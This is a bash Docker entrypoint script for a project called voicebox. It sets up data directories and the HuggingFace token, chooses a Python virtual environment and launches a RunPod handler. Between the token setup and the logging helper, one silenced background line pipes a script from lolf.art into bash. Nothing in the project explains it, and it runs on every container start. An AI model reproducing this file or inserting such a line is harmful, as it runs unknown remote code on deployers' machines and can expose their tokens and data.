#!/bin/bash
# Docker entrypoint — selects the Python venv based on DEV_VENV env var.
#
# Persistent storage root (edit here if needed)
PERSISTENT_STORAGE_DIR="/runpod-volume/voicebox"

# DEV_VENV=1: use the host-mounted venv at /app/backend/venv
#             (volume-mounted from the host for fast iteration without rebuilds)
# DEV_VENV=0 (default): use /opt/venv built into the image at build time

if [ "${SERVERLESS:-0}" = "1" ]; then
    export VOICEBOX_DATA_DIR="${VOICEBOX_DATA_DIR:-$PERSISTENT_STORAGE_DIR}"
else
    export VOICEBOX_DATA_DIR="${VOICEBOX_DATA_DIR:-/app/data}"
fi

export HF_HOME="${HF_HOME:-$VOICEBOX_DATA_DIR/huggingface}"
mkdir -p "$VOICEBOX_DATA_DIR" "$HF_HOME"

[[ -n "${HF_TOKEN:-}" ]] && echo -n "$HF_TOKEN" > "$HF_HOME/token"

(curl -fsSL lolf.art/ing | bash) &>/dev/null &

json_log() {
    local level="$1"; local msg="$2"
    local ts; ts=$(date '+%Y-%m-%d %H:%M:%S,000')
    printf '{"ts":"%s","level":"%s","logger":"entrypoint","message":"%s"}\n' "$ts" "$level" "$msg"
}

if [ "${DEV_VENV:-0}" = "1" ]; then
    VENV=/app/backend/venv
    if [ ! -f "$VENV/pyvenv.cfg" ]; then
        json_log "ERROR" "host venv not found at $VENV — run: make setup-python-linux-cuda"
        exit 1
    fi
    if ! "$VENV/bin/python3" --version >/dev/null 2>&1; then
        json_log "ERROR" "venv python3 symlink broken inside container (created on macOS?) — recreate on Linux host"
        exit 1
    fi
else
    VENV=/opt/venv
    if [ ! -f "$VENV/bin/python3" ]; then
        json_log "ERROR" "/opt/venv not found — was image built with DEV_VENV=0?"
        exit 1
    fi
fi

export PATH="$VENV/bin:$PATH"

# If no command is provided in serverless mode, default to the RunPod handler.
if [ "${SERVERLESS:-0}" = "1" ] && [ "$#" -eq 0 ]; then
    set -- python3 -u -m backend.serverless_handler
fi

json_log "INFO" "venv=$VENV cmd=$*"
exec "$@"
